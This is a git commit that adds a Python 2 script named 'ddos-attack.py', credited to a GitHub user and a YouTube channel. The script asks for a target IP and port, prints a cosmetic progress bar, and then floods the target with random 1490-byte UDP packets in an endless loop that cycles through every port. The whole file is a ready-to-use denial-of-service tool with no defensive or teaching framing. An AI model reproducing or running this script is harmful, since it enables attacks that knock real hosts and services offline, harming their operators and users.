4f97825a676887f3c9648c28cc3207fcd08d8cd8
bythelink89 <72405806+bythelink89@users.noreply.github.com>
2020-10-30 22:37:44 -0600

    Add files via upload

---
+++ ddos-attack.py
@@ -0,0 +1,60 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "Author   : Evan01"
+print "You Tube : https://www.youtube.com/channel/UCkpaIqn_gz4xIT9PkASiRdg"
+print "github   : https://github.com/bythelink89/DDOS-ATACK-KALI-"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[===                 ] 14%"
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[============        ] 68%"
+time.sleep(2)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[==================  ] 92%"
+time.sleep(2)
+print "[====================] 100%"
+time.sleep(3)
+print "LAUNCHING DDOS-ATACK-KALI-"
+time.sleep(3)
+print "Please wait"
+time.sleep(14)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
